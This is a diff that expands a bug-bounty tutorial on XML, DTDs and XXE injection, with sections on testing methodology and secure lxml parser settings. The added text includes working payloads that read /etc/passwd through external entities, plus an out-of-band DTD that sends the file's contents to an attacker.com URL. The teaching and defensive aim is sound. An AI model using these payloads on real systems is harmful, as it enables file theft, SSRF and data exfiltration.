@@ -1,382 +1,748 @@
----
+# XML & XXE (XML External Entity) — Complete Notes
 
-XXE (XML External Entity) - Complete Notes
-When many bug bounty hunters first encounter XXE (XML External Entity Injection), they immediately start memorizing payloads. However, without understanding how XML actually works, XXE often feels like magic.
-In this article, we'll build the foundation first:
-What XML is
+## What is XML?
 
-What DTDs are
+XML (**eXtensible Markup Language**) is a markup language used to store and transport data.
 
-What entities are
+It is similar to HTML, but unlike HTML, XML does **not** have predefined tags.
 
-How XML parsers process data
+HTML has built-in tags such as:
 
-How XXE vulnerabilities happen
+```html
+<h1>Title</h1>
+<p>Paragraph</p>
+```
 
-How attackers escalate XXE into SSRF and Blind XXE
+Browsers already know what these tags mean.
 
-How developers can prevent it
+In XML, you create your own tags based on your application's needs.
 
----
-
-What Is XML?
-XML stands for eXtensible Markup Language.
-It is a markup language designed to store and transport structured data.
-Many beginners think XML is just another version of HTML, but there is one major difference:
-HTML comes with predefined tags. Browsers already know what those tags mean.
-XML does not have predefined tags.
-You create your own tags based on your application's needs.
 Example:
+
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
+
 <person>
     <name>p0nther</name>
-    <job>Hacker</job>
-    <goal>Pwn2Own</goal>
+    <job>hacker</job>
+    <goal>pwn2own</goal>
     <role_model>Orange Tsai</role_model>
 </person>
-XML is simply a structured way to represent information.
+```
+
+XML is simply a structured way to store data.
 
 ---
 
-Why Was XML Created?
-Imagine 50 companies exchanging data.
-Without standards, one company may send:
+## Why Was XML Created?
+
+Imagine 50 different companies exchanging data.
+
+Without a standard format:
+
+```xml
 <username>john</username>
-Another may send:
+```
+
+Another company may send:
+
+```xml
 <user>john</user>
+```
+
 And another:
+
+```xml
 <name>john</name>
-The receiving application would constantly need special handling for every format.
-XML solves the data structure problem.
-However, we still need a way to define:
-Which tags are allowed
+```
 
-Which tags are required
+The receiving application would not know what to expect.
 
-The order of tags
+XML solves the data-format problem, but we still need a way to define:
 
-Which attributes are valid
+* Which tags are allowed
+* Which tags are required
+* What order tags must appear in
+* Which attributes are valid
 
-This is where DTD comes in.
+This is where **DTD** comes in.
 
 ---
 
-What Is DTD?
-DTD stands for Document Type Definition.
+# DTD (Document Type Definition)
+
+DTD stands for **Document Type Definition**.
+
 Think of it as a rulebook for XML files.
-It tells the parser:
-Which tags are valid
 
-Which tags must exist
+It tells the XML parser:
 
-How elements are structured
+* Which tags are valid
+* Which tags are required
+* Which attributes are allowed
+* How elements are structured
 
-Which attributes are allowed
+Example DTD:
 
-Example:
-ELEMENT note (to, from, message)
-ELEMENT to (#PCDATA)
-ELEMENT from (#PCDATA)
-ELEMENT message (#PCDATA)
-This DTD says a note must contain:
-to
+```dtd
+<!ELEMENT note (to, from, message)>
+<!ELEMENT to (#PCDATA)>
+<!ELEMENT from (#PCDATA)>
+<!ELEMENT message (#PCDATA)>
+```
 
-from
+This means:
 
-message
+* `<note>` must contain:
 
-and each of those elements contains text.
+  * `<to>`
+  * `<from>`
+  * `<message>`
+
+and all of them contain text data.
 
 ---
 
-Why Do Developers Use DTD?
-Imagine a company receives thousands of XML files daily.
-Without validation, someone might send:
+# Why Do Developers Use DTD?
+
+Imagine many companies sending XML data.
+
+Without validation:
+
+```xml
 <note>
     <sender>Bob</sender>
 </note>
-while the application expects:
+```
+
+The application may break because it expects:
+
+```xml
 <note>
     <from>Bob</from>
 </note>
-The application could fail.
-DTD prevents this by enforcing rules.
-It can:
-Ensure required tags exist
+```
 
-Reject unexpected tags
+DTD ensures:
 
-Validate structure
+✅ Required tags exist
 
-Standardize data between systems
+✅ Unexpected tags are rejected
+
+✅ Structure is correct
+
+✅ Data follows agreed rules
 
 ---
 
-Internal DTD
-An Internal DTD is written directly inside the XML document.
+# External DTD
+
+Instead of putting all rules inside the XML file, developers often store them in a separate file.
+
 Example:
-DOCTYPE BUGS [
-ELEMENT BUGS (item+)
-ELEMENT item (name,severity)
-ELEMENT name (#PCDATA)
-ELEMENT severity (#PCDATA)
-ATTLIST item PRIORITY CDATA "0"
-]
+
+```xml
+<!DOCTYPE note SYSTEM "https://example.com/note.dtd">
+```
+
+The parser downloads:
+
+```dtd
+<!ELEMENT note (to, from, message)>
+<!ELEMENT to (#PCDATA)>
+<!ELEMENT from (#PCDATA)>
+<!ELEMENT message (#PCDATA)>
+<!ENTITY signature "Best regards, Engineering Team">
+```
+
+Then validates the XML against those rules.
+
 Example XML:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE note SYSTEM "https://example.com/note.dtd">
+
+<note>
+    <to>Alice</to>
+    <from>Bob</from>
+    <message>The server is deployed. &signature;</message>
+</note>
+```
+
+After entity expansion:
+
+```xml
+<message>
+The server is deployed. Best regards, Engineering Team
+</message>
+```
+
+---
+
+# How XML Parsers Work
+
+```text
+[Incoming XML]
+        │
+        ▼
+1. Fetch Phase
+        │
+        ├── Read DOCTYPE
+        ├── Read SYSTEM URL
+        └── Download DTD
+        │
+        ▼
+2. Validation Phase
+        │
+        ├── Check required tags
+        ├── Check structure
+        └── Check attributes
+        │
+        ▼
+3. Entity Expansion Phase
+        │
+        ├── Replace entities
+        └── Build final XML object
+        │
+        ▼
+[Application Logic]
+```
+
+---
+
+# Internal DTD vs External DTD
+
+## Internal DTD
+
+Rules are written directly inside the XML file.
+
+```xml
+<!DOCTYPE BUGS [
+
+<!ELEMENT BUGS (item+)>
+
+<!ELEMENT item (name,severity)>
+
+<!ELEMENT name (#PCDATA)>
+
+<!ELEMENT severity (#PCDATA)>
+
+<!ATTLIST item PRIORITY CDATA "0">
+
+]>
+```
+
+Example:
+
+```xml
 <BUGS>
+
     <item PRIORITY="HIGH">
-        <name>Server-Side Bugs</name>
+        <name>Server Side Bugs</name>
         <severity>9.2</severity>
     </item>
+
 </BUGS>
+```
 
 ---
 
-External DTD
-Instead of embedding rules inside every XML file, developers often place them in a separate file.
-Example DTD file:
-ELEMENT BUGS (item+)
-ELEMENT item (name,severity)
-ELEMENT name (#PCDATA)
-ELEMENT severity (#PCDATA)
-Referenced from XML:
-DOCTYPE BUGS SYSTEM "rules.dtd"
-The parser loads the external DTD and validates the XML against it.
-This approach is easier to maintain and reuse across multiple systems.
+## External DTD
+
+Rules are stored in another file.
+
+rules.dtd
+
+```dtd
+<!ELEMENT BUGS (item+)>
+<!ELEMENT item (name,severity)>
+<!ELEMENT name (#PCDATA)>
+<!ELEMENT severity (#PCDATA)>
+```
+
+XML:
+
+```xml
+<!DOCTYPE BUGS SYSTEM "rules.dtd">
+```
+
+### Difference
+
+| Internal DTD              | External DTD                      |
+| ------------------------- | --------------------------------- |
+| Rules inside XML          | Rules stored in another file      |
+| Easier for small projects | Better for large projects         |
+| Hard to maintain          | Reusable                          |
+| Cannot easily share rules | Many XML files can share same DTD |
 
 ---
 
-Understanding XML Entities
-Entities are essentially variables inside XML.
-Instead of repeating values everywhere, we define them once and reference them later.
+# XML Entities
+
+Entities are basically variables in XML.
+
+Instead of repeating values many times, we define them once.
+
+---
+
+## Internal Entity
+
+Define:
+
+```xml
+<!ENTITY name "Abdarhman Mohamed (p0nther)">
+```
+
+Use:
+
+```xml
+<name>&name;</name>
+```
+
+Parser expands:
+
+```xml
+<name>Abdarhman Mohamed (p0nther)</name>
+```
+
+---
+
+## External Entity
+
+Instead of storing text directly, XML can load data from an external resource.
+
 Example:
-ENTITY author "Abdarhman Mohamed (p0nther)"
+
+```xml
+<!ENTITY hackMe SYSTEM "file:///etc/passwd">
+```
+
 Usage:
-<name>author</name>
-After expansion, the parser inserts the value of the entity into the document.
-Simple enough.
-But entities become very interesting when they reference external resources.
+
+```xml
+<data>&hackMe;</data>
+```
+
+The parser attempts to read:
+
+```text
+/etc/passwd
+```
+
+and insert its content.
+
+This behavior is the foundation of XXE vulnerabilities.
 
 ---
 
-External Entities
-XML entities can load data from files or URLs.
-Conceptually:
-Entity
-   │
-   ▼
-External File / URL
-   │
-   ▼
-Data Returned To Parser
-If external entities are enabled, the parser may attempt to read local files or contact remote systems.
-This behavior is exactly what makes XXE possible.
+# What is XXE?
 
----
-
-How XML Parsers Process Documents
-Understanding the parser workflow is critical.
-Most XML parsers process documents in roughly this order:
-Incoming XML
-      │
-      ▼
-Read DOCTYPE
-      │
-      ▼
-Load DTD
-      │
-      ▼
-Validate Structure
-      │
-      ▼
-Expand Entities
-      │
-      ▼
-Build Final XML Object
-      │
-      ▼
-Application Logic
-The dangerous step is entity expansion.
-If attackers control the XML document, they may be able to force the parser to load local files or remote resources.
-
----
-
-Introducing XXE
 XXE stands for:
-XML External Entity Injection
+
+**XML External Entity Injection**
+
 It occurs when:
-The application accepts XML input.
 
-External entities are enabled.
+1. The application accepts XML.
+2. External entities are enabled.
+3. The parser processes attacker-controlled entities.
 
-The attacker controls part of the XML document.
+Example:
 
-A vulnerable parser may expand attacker-controlled entities and access resources that should never be exposed.
-Common impacts include:
-Local file disclosure
+```xml
+<?xml version="1.0"?>
 
-Internal network access
+<!DOCTYPE foo [
 
-SSRF
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
 
-Blind data exfiltration
+]>
 
----
+<data>
+    <name>&xxe;</name>
+</data>
+```
 
-Detecting XXE
-A good testing methodology is to move gradually.
-Step 1: Confirm Entity Expansion
-Start with a harmless entity.
-If the application reflects the expanded value, entity processing is enabled.
+If vulnerable, the parser reads:
 
----
+```text
+/etc/passwd
+```
 
-Step 2: Attempt File Disclosure
-Try referencing a local file.
-If file contents appear in the response, XXE is confirmed.
-Potential targets include:
-Configuration files
-
-Application source code
-
-Environment files
-
-Logs
+and injects it into the XML document.
 
 ---
 
-Step 3: Test Outbound Requests
-Try referencing a URL you control.
-If your server receives a request, outbound communication is possible.
-This becomes important for Blind XXE testing.
+# When Direct Output Works
+
+Typical file read:
+
+```xml
+<?xml version="1.0"?>
+
+<!DOCTYPE foo [
+
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+
+]>
+
+<data>
+    <name>&xxe;</name>
+</data>
+```
+
+Possible impact:
+
+* Local file disclosure
+* Source code disclosure
+* Configuration disclosure
+* Secrets leakage
 
 ---
 
-Blind XXE
-Sometimes the application processes entities but does not return the result.
-The file may be read successfully, but you never see the contents in the response.
-This situation is called Blind XXE.
-In these cases, attackers often rely on external interactions to confirm exploitation.
+# Blind XXE
+
+Sometimes the application processes entities but does not display the result.
+
+Example:
+
+```xml
+<data>
+    <name>&xxe;</name>
+</data>
+```
+
+The server reads the file but never shows it to us.
+
+In this case we need another technique.
 
 ---
 
-Parameter Entities
-XML supports a special type of entity called a parameter entity.
-Normal entities are referenced inside XML content.
-Parameter entities are primarily used inside DTD files.
-These become important when working with advanced XXE techniques involving external DTDs.
+# Parameter Entities (%)
+
+Normal entities:
+
+```xml
+<!ENTITY test "hello">
+```
+
+Called with:
+
+```xml
+&test;
+```
+
+Parameter entities:
+
+```xml
+<!ENTITY % test "hello">
+```
+
+Called with:
+
+```xml
+%test;
+```
+
+Parameter entities are mainly used inside DTDs.
 
 ---
 
-Loading a Remote DTD
-Instead of embedding a large DTD inside a request, an attacker may attempt to make the parser load a DTD hosted on another server.
-Conceptually:
-XML Document
-      │
-      ▼
-External DTD
-      │
-      ▼
-Parser Processes Rules
-If external DTD loading is enabled, the parser may download and process the remote DTD.
+# Loading External DTDs
+
+Instead of writing everything inline:
+
+```xml
+<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
+%remote;
+```
+
+The parser downloads:
+
+```text
+http://attacker.com/evil.dtd
+```
+
+and executes whatever is inside it.
 
 ---
 
-Out-of-Band XXE
-Sometimes the application does not display any file contents.
-In such cases, attackers may attempt to force the vulnerable server to interact with an external system under their control.
-Conceptually:
-Victim Parser
-      │
-      ▼
-Loads Remote DTD
-      │
-      ▼
-Processes Entities
-      │
-      ▼
-Makes External Request
-      │
-      ▼
-Attacker Observes Activity
-This technique is known as Out-of-Band (OOB) XXE.
+# Out-of-Band (OOB) XXE
+
+Used when:
+
+* File reading works
+* Output is not visible
+
+Goal:
+
+1. Read file
+2. Send content to attacker-controlled server
 
 ---
 
-XXE to SSRF
-One of the most common XXE escalation paths is SSRF.
-Because the XML parser may be capable of making outbound requests, attackers can sometimes force it to access internal resources.
-Conceptually:
-XXE
- │
- ▼
-Server Makes Request
- │
- ▼
-Internal Resource Access
- │
- ▼
-SSRF
-Potential targets include:
+## Step 1 — Create evil.dtd
+
+Host this file on your server:
+
+```dtd
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+
+<!ENTITY % all
+"<!ENTITY &#x25; send SYSTEM 'https://attacker.com/?data=%file;'>">
+
+%all;
+%send;
+```
+
+---
+
+## Step 2 — Make Target Load It
+
+```xml
+<?xml version="1.0"?>
+
+<!DOCTYPE data [
+
+<!ENTITY % load_external SYSTEM "http://attacker.com/evil.dtd">
+
+%load_external;
+
+]>
+
+<data>test</data>
+```
+
+Flow:
+
+```text
+Target XML Parser
+        │
+        ▼
+Downloads evil.dtd
+        │
+        ▼
+Reads /etc/passwd
+        │
+        ▼
+Sends data to attacker.com
+```
+
+This technique is called:
+
+**Out-of-Band XXE (OOB XXE)**
+
+---
+
+# Typical XXE Testing Methodology
+
+## 1. Confirm Entity Expansion
+
+```xml
+<!DOCTYPE user [
+
+<!ENTITY test "XXE_WORKS">
+
+]>
+
+<user>
+    <name>&test;</name>
+</user>
+```
+
+If you see:
+
+```text
+XXE_WORKS
+```
+
+Entity expansion is enabled.
+
+---
+
+## 2. Attempt File Read
+
+```xml
+<!DOCTYPE foo [
+
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+
+]>
+```
+
+---
+
+## 3. Cloud Metadata Access
+
+Historically, cloud environments exposed instance metadata services that could be queried from the server itself. Accessing such services through SSRF or XXE can reveal sensitive instance information if protections are missing.
+
+---
+
+## 4. Test Outbound Requests
+
+Use your own listener:
+
+```xml
+<!DOCTYPE foo [
+
+<!ENTITY xxe SYSTEM "http://your-server.com">
+
+]>
+```
+
+If your server receives a request, outbound network access exists.
+
+---
+
+## 5. Move to OOB XXE
+
+Load your external DTD and exfiltrate data through your controlled endpoint.
+
+---
+
+# XXE Impact
+
+## File Read
+
+```text
+/etc/passwd
+web.config
+application secrets
+source code
+```
+
+---
+
+## SSRF
+
+XXE can force the server to make requests to internal systems.
+
+```text
+XXE → SSRF
+```
+
+Possible targets:
+
+```text
 Internal APIs
-
-Administrative panels
-
-Microservices
-
+Admin panels
 Cloud services
-
-The exact impact depends on the target environment.
+Microservices
+```
 
 ---
 
-Vulnerable Python Example
-A common mistake is enabling entity resolution.
-from lxml import etree
+## RCE
+
+In some rare cases:
+
+```text
+XXE → SSRF → Internal Service Abuse → RCE
+```
+
+or
+
+```text
+XXE → Dangerous Parser Feature → RCE
+```
+
+The exact path depends on the target environment.
+
+---
+
+# Vulnerable Python Example
+
+```python
 parser = etree.XMLParser(
     resolve_entities=True,
     no_network=False
 )
+```
+
 Problems:
-resolve_entities=True expands attacker-controlled entities.
 
-no_network=False allows external resource fetching.
+```python
+resolve_entities=True
+```
 
-This can create XXE vulnerabilities.
+Allows entity expansion.
+
+```python
+no_network=False
+```
+
+Allows external resource fetching.
+
+This configuration may permit XXE attacks.
 
 ---
 
-Secure Python Example
-from lxml import etree
+# Secure Python Example
+
+```python
 parser = etree.XMLParser(
     resolve_entities=False,
     load_dtd=False,
     no_network=True
 )
+```
+
 Why?
-resolve_entities=False disables entity expansion.
 
-load_dtd=False blocks external DTD loading.
+```python
+resolve_entities=False
+```
 
-no_network=True prevents outbound network requests.
+Prevents entity expansion.
 
-Together, these settings eliminate the most common XXE attack paths.
+```python
+load_dtd=False
+```
+
+Blocks external DTD loading.
+
+```python
+no_network=True
+```
+
+Blocks network access from parser.
+
+Together they significantly reduce XXE risk.
 
 ---
 
-Final Thoughts
-Most XXE payloads look simple.
-However, understanding why they work requires understanding XML itself.
-The attack exists because:
-XML supports entities.
+# Quick Summary
 
-Entities can reference external resources.
+XML:
 
-XML parsers automatically process those resources.
+* Used to store and transport structured data.
+* Allows custom tags.
 
-Applications trust the parser.
+DTD:
 
-Once you understand DTDs, entities, parser behavior, and external resource loading, XXE becomes much easier to understand.
-As a bug bounty hunter, don't focus on memorizing payloads.
-Focus on understanding the parser.
-That's where the vulnerability actually lives.
+* Defines XML rules.
+* Can be internal or external.
+
+Entities:
+
+* XML variables.
+* Can contain text or external resources.
+
+XXE:
+
+* Occurs when external entities are processed.
+* Can lead to:
+
+  * File disclosure
+  * SSRF
+  * Blind data exfiltration
+  * Sometimes further compromise depending on environment
+
+Defenses:
+
+* Disable entity expansion.
+* Disable DTD loading.
+* Disable parser network access.
+* Use secure XML parser configurations.
